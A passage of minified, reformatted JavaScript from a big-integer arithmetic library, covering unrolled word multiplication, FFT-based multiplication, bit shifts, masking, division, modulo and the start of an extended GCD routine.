                        (lo = (lo + Math.imul(al5, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh4)) | 0) + Math.imul(ah5, bl4)) | 0),
                        (hi = (hi + Math.imul(ah5, bh4)) | 0),
                        (lo = (lo + Math.imul(al4, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh5)) | 0) + Math.imul(ah4, bl5)) | 0),
                        (hi = (hi + Math.imul(ah4, bh5)) | 0),
                        (lo = (lo + Math.imul(al3, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh6)) | 0) + Math.imul(ah3, bl6)) | 0),
                        (hi = (hi + Math.imul(ah3, bh6)) | 0),
                        (lo = (lo + Math.imul(al2, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh7)) | 0) + Math.imul(ah2, bl7)) | 0),
                        (hi = (hi + Math.imul(ah2, bh7)) | 0),
                        (lo = (lo + Math.imul(al1, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh8)) | 0) + Math.imul(ah1, bl8)) | 0),
                        (hi = (hi + Math.imul(ah1, bh8)) | 0);
                    var w9 = (((c + (lo = (lo + Math.imul(al0, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh9)) | 0) + Math.imul(ah0, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh9)) | 0) + (mid >>> 13)) | 0) + (w9 >>> 26)) | 0),
                        (w9 &= 67108863),
                        (lo = Math.imul(al9, bl1)),
                        (mid = ((mid = Math.imul(al9, bh1)) + Math.imul(ah9, bl1)) | 0),
                        (hi = Math.imul(ah9, bh1)),
                        (lo = (lo + Math.imul(al8, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh2)) | 0) + Math.imul(ah8, bl2)) | 0),
                        (hi = (hi + Math.imul(ah8, bh2)) | 0),
                        (lo = (lo + Math.imul(al7, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh3)) | 0) + Math.imul(ah7, bl3)) | 0),
                        (hi = (hi + Math.imul(ah7, bh3)) | 0),
                        (lo = (lo + Math.imul(al6, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh4)) | 0) + Math.imul(ah6, bl4)) | 0),
                        (hi = (hi + Math.imul(ah6, bh4)) | 0),
                        (lo = (lo + Math.imul(al5, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh5)) | 0) + Math.imul(ah5, bl5)) | 0),
                        (hi = (hi + Math.imul(ah5, bh5)) | 0),
                        (lo = (lo + Math.imul(al4, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh6)) | 0) + Math.imul(ah4, bl6)) | 0),
                        (hi = (hi + Math.imul(ah4, bh6)) | 0),
                        (lo = (lo + Math.imul(al3, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh7)) | 0) + Math.imul(ah3, bl7)) | 0),
                        (hi = (hi + Math.imul(ah3, bh7)) | 0),
                        (lo = (lo + Math.imul(al2, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh8)) | 0) + Math.imul(ah2, bl8)) | 0),
                        (hi = (hi + Math.imul(ah2, bh8)) | 0);
                    var w10 = (((c + (lo = (lo + Math.imul(al1, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al1, bh9)) | 0) + Math.imul(ah1, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah1, bh9)) | 0) + (mid >>> 13)) | 0) + (w10 >>> 26)) | 0),
                        (w10 &= 67108863),
                        (lo = Math.imul(al9, bl2)),
                        (mid = ((mid = Math.imul(al9, bh2)) + Math.imul(ah9, bl2)) | 0),
                        (hi = Math.imul(ah9, bh2)),
                        (lo = (lo + Math.imul(al8, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh3)) | 0) + Math.imul(ah8, bl3)) | 0),
                        (hi = (hi + Math.imul(ah8, bh3)) | 0),
                        (lo = (lo + Math.imul(al7, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh4)) | 0) + Math.imul(ah7, bl4)) | 0),
                        (hi = (hi + Math.imul(ah7, bh4)) | 0),
                        (lo = (lo + Math.imul(al6, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh5)) | 0) + Math.imul(ah6, bl5)) | 0),
                        (hi = (hi + Math.imul(ah6, bh5)) | 0),
                        (lo = (lo + Math.imul(al5, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh6)) | 0) + Math.imul(ah5, bl6)) | 0),
                        (hi = (hi + Math.imul(ah5, bh6)) | 0),
                        (lo = (lo + Math.imul(al4, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh7)) | 0) + Math.imul(ah4, bl7)) | 0),
                        (hi = (hi + Math.imul(ah4, bh7)) | 0),
                        (lo = (lo + Math.imul(al3, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh8)) | 0) + Math.imul(ah3, bl8)) | 0),
                        (hi = (hi + Math.imul(ah3, bh8)) | 0);
                    var w11 = (((c + (lo = (lo + Math.imul(al2, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al2, bh9)) | 0) + Math.imul(ah2, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah2, bh9)) | 0) + (mid >>> 13)) | 0) + (w11 >>> 26)) | 0),
                        (w11 &= 67108863),
                        (lo = Math.imul(al9, bl3)),
                        (mid = ((mid = Math.imul(al9, bh3)) + Math.imul(ah9, bl3)) | 0),
                        (hi = Math.imul(ah9, bh3)),
                        (lo = (lo + Math.imul(al8, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh4)) | 0) + Math.imul(ah8, bl4)) | 0),
                        (hi = (hi + Math.imul(ah8, bh4)) | 0),
                        (lo = (lo + Math.imul(al7, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh5)) | 0) + Math.imul(ah7, bl5)) | 0),
                        (hi = (hi + Math.imul(ah7, bh5)) | 0),
                        (lo = (lo + Math.imul(al6, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh6)) | 0) + Math.imul(ah6, bl6)) | 0),
                        (hi = (hi + Math.imul(ah6, bh6)) | 0),
                        (lo = (lo + Math.imul(al5, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh7)) | 0) + Math.imul(ah5, bl7)) | 0),
                        (hi = (hi + Math.imul(ah5, bh7)) | 0),
                        (lo = (lo + Math.imul(al4, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh8)) | 0) + Math.imul(ah4, bl8)) | 0),
                        (hi = (hi + Math.imul(ah4, bh8)) | 0);
                    var w12 = (((c + (lo = (lo + Math.imul(al3, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al3, bh9)) | 0) + Math.imul(ah3, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah3, bh9)) | 0) + (mid >>> 13)) | 0) + (w12 >>> 26)) | 0),
                        (w12 &= 67108863),
                        (lo = Math.imul(al9, bl4)),
                        (mid = ((mid = Math.imul(al9, bh4)) + Math.imul(ah9, bl4)) | 0),
                        (hi = Math.imul(ah9, bh4)),
                        (lo = (lo + Math.imul(al8, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh5)) | 0) + Math.imul(ah8, bl5)) | 0),
                        (hi = (hi + Math.imul(ah8, bh5)) | 0),
                        (lo = (lo + Math.imul(al7, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh6)) | 0) + Math.imul(ah7, bl6)) | 0),
                        (hi = (hi + Math.imul(ah7, bh6)) | 0),
                        (lo = (lo + Math.imul(al6, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh7)) | 0) + Math.imul(ah6, bl7)) | 0),
                        (hi = (hi + Math.imul(ah6, bh7)) | 0),
                        (lo = (lo + Math.imul(al5, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh8)) | 0) + Math.imul(ah5, bl8)) | 0),
                        (hi = (hi + Math.imul(ah5, bh8)) | 0);
                    var w13 = (((c + (lo = (lo + Math.imul(al4, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al4, bh9)) | 0) + Math.imul(ah4, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah4, bh9)) | 0) + (mid >>> 13)) | 0) + (w13 >>> 26)) | 0),
                        (w13 &= 67108863),
                        (lo = Math.imul(al9, bl5)),
                        (mid = ((mid = Math.imul(al9, bh5)) + Math.imul(ah9, bl5)) | 0),
                        (hi = Math.imul(ah9, bh5)),
                        (lo = (lo + Math.imul(al8, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh6)) | 0) + Math.imul(ah8, bl6)) | 0),
                        (hi = (hi + Math.imul(ah8, bh6)) | 0),
                        (lo = (lo + Math.imul(al7, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh7)) | 0) + Math.imul(ah7, bl7)) | 0),
                        (hi = (hi + Math.imul(ah7, bh7)) | 0),
                        (lo = (lo + Math.imul(al6, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh8)) | 0) + Math.imul(ah6, bl8)) | 0),
                        (hi = (hi + Math.imul(ah6, bh8)) | 0);
                    var w14 = (((c + (lo = (lo + Math.imul(al5, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al5, bh9)) | 0) + Math.imul(ah5, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah5, bh9)) | 0) + (mid >>> 13)) | 0) + (w14 >>> 26)) | 0),
                        (w14 &= 67108863),
                        (lo = Math.imul(al9, bl6)),
                        (mid = ((mid = Math.imul(al9, bh6)) + Math.imul(ah9, bl6)) | 0),
                        (hi = Math.imul(ah9, bh6)),
                        (lo = (lo + Math.imul(al8, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh7)) | 0) + Math.imul(ah8, bl7)) | 0),
                        (hi = (hi + Math.imul(ah8, bh7)) | 0),
                        (lo = (lo + Math.imul(al7, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh8)) | 0) + Math.imul(ah7, bl8)) | 0),
                        (hi = (hi + Math.imul(ah7, bh8)) | 0);
                    var w15 = (((c + (lo = (lo + Math.imul(al6, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al6, bh9)) | 0) + Math.imul(ah6, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah6, bh9)) | 0) + (mid >>> 13)) | 0) + (w15 >>> 26)) | 0),
                        (w15 &= 67108863),
                        (lo = Math.imul(al9, bl7)),
                        (mid = ((mid = Math.imul(al9, bh7)) + Math.imul(ah9, bl7)) | 0),
                        (hi = Math.imul(ah9, bh7)),
                        (lo = (lo + Math.imul(al8, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh8)) | 0) + Math.imul(ah8, bl8)) | 0),
                        (hi = (hi + Math.imul(ah8, bh8)) | 0);
                    var w16 = (((c + (lo = (lo + Math.imul(al7, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al7, bh9)) | 0) + Math.imul(ah7, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah7, bh9)) | 0) + (mid >>> 13)) | 0) + (w16 >>> 26)) | 0),
                        (w16 &= 67108863),
                        (lo = Math.imul(al9, bl8)),
                        (mid = ((mid = Math.imul(al9, bh8)) + Math.imul(ah9, bl8)) | 0),
                        (hi = Math.imul(ah9, bh8));
                    var w17 = (((c + (lo = (lo + Math.imul(al8, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al8, bh9)) | 0) + Math.imul(ah8, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah8, bh9)) | 0) + (mid >>> 13)) | 0) + (w17 >>> 26)) | 0), (w17 &= 67108863);
                    var w18 = (((c + (lo = Math.imul(al9, bl9))) | 0) + ((8191 & (mid = ((mid = Math.imul(al9, bh9)) + Math.imul(ah9, bl9)) | 0)) << 13)) | 0;
                    return (
                        (c = ((((hi = Math.imul(ah9, bh9)) + (mid >>> 13)) | 0) + (w18 >>> 26)) | 0),
                        (w18 &= 67108863),
                        (o[0] = w0),
                        (o[1] = w1),
                        (o[2] = w2),
                        (o[3] = w3),
                        (o[4] = w4),
                        (o[5] = w5),
                        (o[6] = w6),
                        (o[7] = w7),
                        (o[8] = w8),
                        (o[9] = w9),
                        (o[10] = w10),
                        (o[11] = w11),
                        (o[12] = w12),
                        (o[13] = w13),
                        (o[14] = w14),
                        (o[15] = w15),
                        (o[16] = w16),
                        (o[17] = w17),
                        (o[18] = w18),
                        0 !== c && ((o[19] = c), out.length++),
                        out
                    );
                };
                function jumboMulTo(self, num, out) {
                    return new FFTM().mulp(self, num, out);
                }
                function FFTM(x, y) {
                    (this.x = x), (this.y = y);
                }
                Math.imul || (comb10MulTo = smallMulTo),
                    (BN.prototype.mulTo = function (num, out) {
                        var len = this.length + num.length;
                        return 10 === this.length && 10 === num.length
                            ? comb10MulTo(this, num, out)
                            : len < 63
                            ? smallMulTo(this, num, out)
                            : len < 1024
                            ? (function (self, num, out) {
                                  (out.negative = num.negative ^ self.negative), (out.length = self.length + num.length);
                                  for (var carry = 0, hncarry = 0, k = 0; k < out.length - 1; k++) {
                                      var ncarry = hncarry;
                                      hncarry = 0;
                                      for (var rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                                          var i = k - j,
                                              r = (0 | self.words[i]) * (0 | num.words[j]),
                                              lo = 67108863 & r;
                                          (rword = 67108863 & (lo = (lo + rword) | 0)), (hncarry += (ncarry = ((ncarry = (ncarry + ((r / 67108864) | 0)) | 0) + (lo >>> 26)) | 0) >>> 26), (ncarry &= 67108863);
                                      }
                                      (out.words[k] = rword), (carry = ncarry), (ncarry = hncarry);
                                  }
                                  return 0 !== carry ? (out.words[k] = carry) : out.length--, out.strip();
                              })(this, num, out)
                            : jumboMulTo(this, num, out);
                    }),
                    (FFTM.prototype.makeRBT = function (N) {
                        for (var t = new Array(N), l = BN.prototype._countBits(N) - 1, i = 0; i < N; i++) t[i] = this.revBin(i, l, N);
                        return t;
                    }),
                    (FFTM.prototype.revBin = function (x, l, N) {
                        if (0 === x || x === N - 1) return x;
                        for (var rb = 0, i = 0; i < l; i++) (rb |= (1 & x) << (l - i - 1)), (x >>= 1);
                        return rb;
                    }),
                    (FFTM.prototype.permute = function (rbt, rws, iws, rtws, itws, N) {
                        for (var i = 0; i < N; i++) (rtws[i] = rws[rbt[i]]), (itws[i] = iws[rbt[i]]);
                    }),
                    (FFTM.prototype.transform = function (rws, iws, rtws, itws, N, rbt) {
                        this.permute(rbt, rws, iws, rtws, itws, N);
                        for (var s = 1; s < N; s <<= 1)
                            for (var l = s << 1, rtwdf = Math.cos((2 * Math.PI) / l), itwdf = Math.sin((2 * Math.PI) / l), p = 0; p < N; p += l)
                                for (var rtwdf_ = rtwdf, itwdf_ = itwdf, j = 0; j < s; j++) {
                                    var re = rtws[p + j],
                                        ie = itws[p + j],
                                        ro = rtws[p + j + s],
                                        io = itws[p + j + s],
                                        rx = rtwdf_ * ro - itwdf_ * io;
                                    (io = rtwdf_ * io + itwdf_ * ro),
                                        (ro = rx),
                                        (rtws[p + j] = re + ro),
                                        (itws[p + j] = ie + io),
                                        (rtws[p + j + s] = re - ro),
                                        (itws[p + j + s] = ie - io),
                                        j !== l && ((rx = rtwdf * rtwdf_ - itwdf * itwdf_), (itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_), (rtwdf_ = rx));
                                }
                    }),
                    (FFTM.prototype.guessLen13b = function (n, m) {
                        var N = 1 | Math.max(m, n),
                            odd = 1 & N,
                            i = 0;
                        for (N = (N / 2) | 0; N; N >>>= 1) i++;
                        return 1 << (i + 1 + odd);
                    }),
                    (FFTM.prototype.conjugate = function (rws, iws, N) {
                        if (!(N <= 1))
                            for (var i = 0; i < N / 2; i++) {
                                var t = rws[i];
                                (rws[i] = rws[N - i - 1]), (rws[N - i - 1] = t), (t = iws[i]), (iws[i] = -iws[N - i - 1]), (iws[N - i - 1] = -t);
                            }
                    }),
                    (FFTM.prototype.normalize13b = function (ws, N) {
                        for (var carry = 0, i = 0; i < N / 2; i++) {
                            var w = 8192 * Math.round(ws[2 * i + 1] / N) + Math.round(ws[2 * i] / N) + carry;
                            (ws[i] = 67108863 & w), (carry = w < 67108864 ? 0 : (w / 67108864) | 0);
                        }
                        return ws;
                    }),
                    (FFTM.prototype.convert13b = function (ws, len, rws, N) {
                        for (var carry = 0, i = 0; i < len; i++) (carry += 0 | ws[i]), (rws[2 * i] = 8191 & carry), (carry >>>= 13), (rws[2 * i + 1] = 8191 & carry), (carry >>>= 13);
                        for (i = 2 * len; i < N; ++i) rws[i] = 0;
                        assert(0 === carry), assert(0 == (-8192 & carry));
                    }),
                    (FFTM.prototype.stub = function (N) {
                        for (var ph = new Array(N), i = 0; i < N; i++) ph[i] = 0;
                        return ph;
                    }),
                    (FFTM.prototype.mulp = function (x, y, out) {
                        var N = 2 * this.guessLen13b(x.length, y.length),
                            rbt = this.makeRBT(N),
                            _ = this.stub(N),
                            rws = new Array(N),
                            rwst = new Array(N),
                            iwst = new Array(N),
                            nrws = new Array(N),
                            nrwst = new Array(N),
                            niwst = new Array(N),
                            rmws = out.words;
                        (rmws.length = N), this.convert13b(x.words, x.length, rws, N), this.convert13b(y.words, y.length, nrws, N), this.transform(rws, _, rwst, iwst, N, rbt), this.transform(nrws, _, nrwst, niwst, N, rbt);
                        for (var i = 0; i < N; i++) {
                            var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];
                            (iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i]), (rwst[i] = rx);
                        }
                        return (
                            this.conjugate(rwst, iwst, N),
                            this.transform(rwst, iwst, rmws, _, N, rbt),
                            this.conjugate(rmws, _, N),
                            this.normalize13b(rmws, N),
                            (out.negative = x.negative ^ y.negative),
                            (out.length = x.length + y.length),
                            out.strip()
                        );
                    }),
                    (BN.prototype.mul = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), this.mulTo(num, out);
                    }),
                    (BN.prototype.mulf = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), jumboMulTo(this, num, out);
                    }),
                    (BN.prototype.imul = function (num) {
                        return this.clone().mulTo(num, this);
                    }),
                    (BN.prototype.imuln = function (num) {
                        assert("number" == typeof num), assert(num < 67108864);
                        for (var carry = 0, i = 0; i < this.length; i++) {
                            var w = (0 | this.words[i]) * num,
                                lo = (67108863 & w) + (67108863 & carry);
                            (carry >>= 26), (carry += (w / 67108864) | 0), (carry += lo >>> 26), (this.words[i] = 67108863 & lo);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.muln = function (num) {
                        return this.clone().imuln(num);
                    }),
                    (BN.prototype.sqr = function () {
                        return this.mul(this);
                    }),
                    (BN.prototype.isqr = function () {
                        return this.imul(this.clone());
                    }),
                    (BN.prototype.pow = function (num) {
                        var w = (function (num) {
                            for (var w = new Array(num.bitLength()), bit = 0; bit < w.length; bit++) {
                                var off = (bit / 26) | 0,
                                    wbit = bit % 26;
                                w[bit] = (num.words[off] & (1 << wbit)) >>> wbit;
                            }
                            return w;
                        })(num);
                        if (0 === w.length) return new BN(1);
                        for (var res = this, i = 0; i < w.length && 0 === w[i]; i++, res = res.sqr());
                        if (++i < w.length) for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) 0 !== w[i] && (res = res.mul(q));
                        return res;
                    }),
                    (BN.prototype.iushln = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var i,
                            r = bits % 26,
                            s = (bits - r) / 26,
                            carryMask = (67108863 >>> (26 - r)) << (26 - r);
                        if (0 !== r) {
                            var carry = 0;
                            for (i = 0; i < this.length; i++) {
                                var newCarry = this.words[i] & carryMask,
                                    c = ((0 | this.words[i]) - newCarry) << r;
                                (this.words[i] = c | carry), (carry = newCarry >>> (26 - r));
                            }
                            carry && ((this.words[i] = carry), this.length++);
                        }
                        if (0 !== s) {
                            for (i = this.length - 1; i >= 0; i--) this.words[i + s] = this.words[i];
                            for (i = 0; i < s; i++) this.words[i] = 0;
                            this.length += s;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.ishln = function (bits) {
                        return assert(0 === this.negative), this.iushln(bits);
                    }),
                    (BN.prototype.iushrn = function (bits, hint, extended) {
                        var h;
                        assert("number" == typeof bits && bits >= 0), (h = hint ? (hint - (hint % 26)) / 26 : 0);
                        var r = bits % 26,
                            s = Math.min((bits - r) / 26, this.length),
                            mask = 67108863 ^ ((67108863 >>> r) << r),
                            maskedWords = extended;
                        if (((h -= s), (h = Math.max(0, h)), maskedWords)) {
                            for (var i = 0; i < s; i++) maskedWords.words[i] = this.words[i];
                            maskedWords.length = s;
                        }
                        if (0 === s);
                        else if (this.length > s) for (this.length -= s, i = 0; i < this.length; i++) this.words[i] = this.words[i + s];
                        else (this.words[0] = 0), (this.length = 1);
                        var carry = 0;
                        for (i = this.length - 1; i >= 0 && (0 !== carry || i >= h); i--) {
                            var word = 0 | this.words[i];
                            (this.words[i] = (carry << (26 - r)) | (word >>> r)), (carry = word & mask);
                        }
                        return maskedWords && 0 !== carry && (maskedWords.words[maskedWords.length++] = carry), 0 === this.length && ((this.words[0] = 0), (this.length = 1)), this.strip();
                    }),
                    (BN.prototype.ishrn = function (bits, hint, extended) {
                        return assert(0 === this.negative), this.iushrn(bits, hint, extended);
                    }),
                    (BN.prototype.shln = function (bits) {
                        return this.clone().ishln(bits);
                    }),
                    (BN.prototype.ushln = function (bits) {
                        return this.clone().iushln(bits);
                    }),
                    (BN.prototype.shrn = function (bits) {
                        return this.clone().ishrn(bits);
                    }),
                    (BN.prototype.ushrn = function (bits) {
                        return this.clone().iushrn(bits);
                    }),
                    (BN.prototype.testn = function (bit) {
                        assert("number" == typeof bit && bit >= 0);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        return !(this.length <= s) && !!(this.words[s] & q);
                    }),
                    (BN.prototype.imaskn = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var r = bits % 26,
                            s = (bits - r) / 26;
                        if ((assert(0 === this.negative, "imaskn works only with positive numbers"), this.length <= s)) return this;
                        if ((0 !== r && s++, (this.length = Math.min(s, this.length)), 0 !== r)) {
                            var mask = 67108863 ^ ((67108863 >>> r) << r);
                            this.words[this.length - 1] &= mask;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.maskn = function (bits) {
                        return this.clone().imaskn(bits);
                    }),
                    (BN.prototype.iaddn = function (num) {
                        return (
                            assert("number" == typeof num),
                            assert(num < 67108864),
                            num < 0
                                ? this.isubn(-num)
                                : 0 !== this.negative
                                ? 1 === this.length && (0 | this.words[0]) < num
                                    ? ((this.words[0] = num - (0 | this.words[0])), (this.negative = 0), this)
                                    : ((this.negative = 0), this.isubn(num), (this.negative = 1), this)
                                : this._iaddn(num)
                        );
                    }),
                    (BN.prototype._iaddn = function (num) {
                        this.words[0] += num;
                        for (var i = 0; i < this.length && this.words[i] >= 67108864; i++) (this.words[i] -= 67108864), i === this.length - 1 ? (this.words[i + 1] = 1) : this.words[i + 1]++;
                        return (this.length = Math.max(this.length, i + 1)), this;
                    }),
                    (BN.prototype.isubn = function (num) {
                        if ((assert("number" == typeof num), assert(num < 67108864), num < 0)) return this.iaddn(-num);
                        if (0 !== this.negative) return (this.negative = 0), this.iaddn(num), (this.negative = 1), this;
                        if (((this.words[0] -= num), 1 === this.length && this.words[0] < 0)) (this.words[0] = -this.words[0]), (this.negative = 1);
                        else for (var i = 0; i < this.length && this.words[i] < 0; i++) (this.words[i] += 67108864), (this.words[i + 1] -= 1);
                        return this.strip();
                    }),
                    (BN.prototype.addn = function (num) {
                        return this.clone().iaddn(num);
                    }),
                    (BN.prototype.subn = function (num) {
                        return this.clone().isubn(num);
                    }),
                    (BN.prototype.iabs = function () {
                        return (this.negative = 0), this;
                    }),
                    (BN.prototype.abs = function () {
                        return this.clone().iabs();
                    }),
                    (BN.prototype._ishlnsubmul = function (num, mul, shift) {
                        var i,
                            w,
                            len = num.length + shift;
                        this._expand(len);
                        var carry = 0;
                        for (i = 0; i < num.length; i++) {
                            w = (0 | this.words[i + shift]) + carry;
                            var right = (0 | num.words[i]) * mul;
                            (carry = ((w -= 67108863 & right) >> 26) - ((right / 67108864) | 0)), (this.words[i + shift] = 67108863 & w);
                        }
                        for (; i < this.length - shift; i++) (carry = (w = (0 | this.words[i + shift]) + carry) >> 26), (this.words[i + shift] = 67108863 & w);
                        if (0 === carry) return this.strip();
                        for (assert(-1 === carry), carry = 0, i = 0; i < this.length; i++) (carry = (w = -(0 | this.words[i]) + carry) >> 26), (this.words[i] = 67108863 & w);
                        return (this.negative = 1), this.strip();
                    }),
                    (BN.prototype._wordDiv = function (num, mode) {
                        var shift = (this.length, num.length),
                            a = this.clone(),
                            b = num,
                            bhi = 0 | b.words[b.length - 1];
                        0 !== (shift = 26 - this._countBits(bhi)) && ((b = b.ushln(shift)), a.iushln(shift), (bhi = 0 | b.words[b.length - 1]));
                        var q,
                            m = a.length - b.length;
                        if ("mod" !== mode) {
                            ((q = new BN(null)).length = m + 1), (q.words = new Array(q.length));
                            for (var i = 0; i < q.length; i++) q.words[i] = 0;
                        }
                        var diff = a.clone()._ishlnsubmul(b, 1, m);
                        0 === diff.negative && ((a = diff), q && (q.words[m] = 1));
                        for (var j = m - 1; j >= 0; j--) {
                            var qj = 67108864 * (0 | a.words[b.length + j]) + (0 | a.words[b.length + j - 1]);
                            for (qj = Math.min((qj / bhi) | 0, 67108863), a._ishlnsubmul(b, qj, j); 0 !== a.negative; ) qj--, (a.negative = 0), a._ishlnsubmul(b, 1, j), a.isZero() || (a.negative ^= 1);
                            q && (q.words[j] = qj);
                        }
                        return q && q.strip(), a.strip(), "div" !== mode && 0 !== shift && a.iushrn(shift), { div: q || null, mod: a };
                    }),
                    (BN.prototype.divmod = function (num, mode, positive) {
                        return (
                            assert(!num.isZero()),
                            this.isZero()
                                ? { div: new BN(0), mod: new BN(0) }
                                : 0 !== this.negative && 0 === num.negative
                                ? ((res = this.neg().divmod(num, mode)), "mod" !== mode && (div = res.div.neg()), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.iadd(num)), { div: div, mod: mod })
                                : 0 === this.negative && 0 !== num.negative
                                ? ((res = this.divmod(num.neg(), mode)), "mod" !== mode && (div = res.div.neg()), { div: div, mod: res.mod })
                                : 0 != (this.negative & num.negative)
                                ? ((res = this.neg().divmod(num.neg(), mode)), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.isub(num)), { div: res.div, mod: mod })
                                : num.length > this.length || this.cmp(num) < 0
                                ? { div: new BN(0), mod: this }
                                : 1 === num.length
                                ? "div" === mode
                                    ? { div: this.divn(num.words[0]), mod: null }
                                    : "mod" === mode
                                    ? { div: null, mod: new BN(this.modn(num.words[0])) }
                                    : { div: this.divn(num.words[0]), mod: new BN(this.modn(num.words[0])) }
                                : this._wordDiv(num, mode)
                        );
                        var div, mod, res;
                    }),
                    (BN.prototype.div = function (num) {
                        return this.divmod(num, "div", !1).div;
                    }),
                    (BN.prototype.mod = function (num) {
                        return this.divmod(num, "mod", !1).mod;
                    }),
                    (BN.prototype.umod = function (num) {
                        return this.divmod(num, "mod", !0).mod;
                    }),
                    (BN.prototype.divRound = function (num) {
                        var dm = this.divmod(num);
                        if (dm.mod.isZero()) return dm.div;
                        var mod = 0 !== dm.div.negative ? dm.mod.isub(num) : dm.mod,
                            half = num.ushrn(1),
                            r2 = num.andln(1),
                            cmp = mod.cmp(half);
                        return cmp < 0 || (1 === r2 && 0 === cmp) ? dm.div : 0 !== dm.div.negative ? dm.div.isubn(1) : dm.div.iaddn(1);
                    }),
                    (BN.prototype.modn = function (num) {
                        assert(num <= 67108863);
                        for (var p = (1 << 26) % num, acc = 0, i = this.length - 1; i >= 0; i--) acc = (p * acc + (0 | this.words[i])) % num;
                        return acc;
                    }),
                    (BN.prototype.idivn = function (num) {
                        assert(num <= 67108863);
                        for (var carry = 0, i = this.length - 1; i >= 0; i--) {
                            var w = (0 | this.words[i]) + 67108864 * carry;
                            (this.words[i] = (w / num) | 0), (carry = w % num);
                        }
                        return this.strip();
                    }),
                    (BN.prototype.divn = function (num) {
                        return this.clone().idivn(num);
                    }),
                    (BN.prototype.egcd = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var x = this,
                            y = p.clone();
                        x = 0 !== x.negative ? x.umod(p) : x.clone();
                        for (var A = new BN(1), B = new BN(0), C = new BN(0), D = new BN(1), g = 0; x.isEven() && y.isEven(); ) x.iushrn(1), y.iushrn(1), ++g;
                        for (var yp = y.clone(), xp = x.clone(); !x.isZero(); ) {
                            for (var i = 0, im = 1; 0 == (x.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (x.iushrn(i); i-- > 0; ) (A.isOdd() || B.isOdd()) && (A.iadd(yp), B.isub(xp)), A.iushrn(1), B.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (y.words[0] & jm) && j < 26; ++j, jm <<= 1);
